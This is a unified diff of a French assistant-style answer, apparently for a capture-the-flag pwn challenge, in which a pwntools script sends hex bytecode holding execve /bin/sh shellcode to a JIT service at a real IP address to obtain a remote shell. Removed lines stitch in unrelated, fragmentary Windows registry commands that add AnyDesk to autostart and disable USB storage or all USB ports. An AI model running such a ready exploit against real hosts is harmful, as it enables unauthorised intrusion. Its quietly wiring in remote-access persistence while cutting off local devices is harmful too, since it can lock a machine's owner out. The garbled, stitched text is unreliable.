@@ -652,101 +652,23 @@ Je vois le serveur tourne bien. Laisse-moi analyser complètement le binaire et 
 | Bypass | Integrity check = djb2 → Collatz(64) → XOR table → pad avec `PUSH 0xd1bef; POP` |
 
 ---
-
-### ⚡ Step 1 — Copier le script sur ta Kali
-
-Sur ta Kali, dans un terminal :
-
-```bash
-cat > ~/exploit_spectral.py << 'EOF'
+python3 - << 'EXPLOIT'
 from pwn import *
 
 HOST = '206.81.0.45'
 PORT = 4445
 
-PAYLOAD_HEX = "0c48000000000000000c31000000000000000cf6000000000000000c48000000000000000c31000000000000000cd2000000000000000c48000000000000000c31000000000000000cc0000000000000000c50000000000000000c48000000000000000cbb000000000000000c2f000000000000000c62000000000000000c69000000000000000c6e000000000000000c2f000000000000000c73000000000000000c68000000000000000c00000000000000000c53000000000000000c48000000000000000c89000000000000000ce7000000000000000cb0000000000000000c3b000000000000000c0f000000000000000c05000000000000000901ef1b0d000000000002"
+PAYLOAD_HEX = "0c48000000000000000c31000000000000000cf6000000000000000c48000000000000000c31000000000000000cd2000000000000000c48000000000000000c31000000000000000cc0000000000000000c50000000000000000c48000000000000000cbb000000000000000c2f000000000000000c62000000000000000c69000000000000000c6e000000000000000c2f000000000000000c73000000000000000c68000000000000000c00000000000000000c53000000000000000c48000000000000000c89000000000000000ce7000000000000000cb0000000000000000c3b000000000000000c0f000000000000000c050000000000000009018f1600000000000002"
 
 io = remote(HOST, PORT)
 io.recvuntil(b'> ', timeout=10)
 
-# [1] Load program
 io.sendline(b'1')
 io.recvuntil(b'): \n', timeout=5)
 io.sendline(PAYLOAD_HEX.encode())
 resp = io.recvuntil(b'> ', timeout=5)
 print(resp.decode(errors='replace'))
 
-# [2] Run -> shell
 io.sendline(b'2')
 io.interactive()
-EOF
-```
-
-### ⚡ Step 2 — Lancer l'exploit
-
-```bash
-python3 ~/exploit_spectral.py
-```
-
-### ⚡ Step 3 — Dans le shell obtenu
-
-```bash
-cat flag.txt
-# ou
-ls
-cat /flag*
-find / -name "flag*" 2>/dev/null
-```
-
----
-
-### 🧠 Explication de l'exploit
-
-```
-Bytecode envoyé:
-  EMIT 0x48    ← émet 1 byte dans le buffer JIT RWX
-  EMIT 0x31    ← ...
-  EMIT 0xf6    ← ...
-  ... (28 EMITs = shellcode execve /bin/sh)
-  JIT_RUN      ← exécute le buffer JIT → SHELL !
-  PUSH 0xd1bef ← padding pour passer l'integrity check
-  POP          ↑
-```
-
-Si le serveur répond `[-] Program rejected` c'est que la version serveur a un hash différent — dis-moi et on rebrute-force localement sur ta machine (c'est rapide en C).
-
-Ouvre CMD en tant qu'administrateur et tape :
-cmdreg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v AnyDesk /t REG_SZ /d "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" /f
-Ça ajoute AnyDesk au démarrage automatique via le registre — plus fiable que le Gestionnaire des tâches dans ton cas.
-
-Vérification
-cmdreg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v AnyDesk
-Si tu vois le chemin d'AnyDesk → ✅ c'est bon, il démarrera automatiquement au prochain boot.
-
-
-💡 Conseil : Pour u
-Méthode 1 : Via le Registre (recommandée)
-cmdreg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Start /t REG_DWORD /d 4 /f
-
-Ceci désactive le stockage USB (clés USB, disques externes) mais garde la souris/clavier USB fonctionnels.
-
-
-Méthode 2 : Désactiver TOUS les ports USB complètement
-cmdreg add "HKLM\SYSTEM\CurrentControlSet\Services\USB" /v Start /t REG_DWORD /d 4 /f
-⚠️ Attention — ceci coupe absolument tous les USB y compris :
-
-Souris
-Clavier
-Dongles Wi-Fi USB
-
-
-Si ton PC utilise Wi-Fi via USB, tu perdras la connexion AnyDesk !
-
-
-Méthode 3 : Via PowerShell (désactiver device par device)
-powershellGet-PnpDevice -Class USB | Disable-PnpDevice -Confirm:$false
-
-Réactiver si besoin
-cmdreg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Start /t REG_DWORD /d 3 /f
-
-✅ Recommandation pour toi
+EXPLOIT
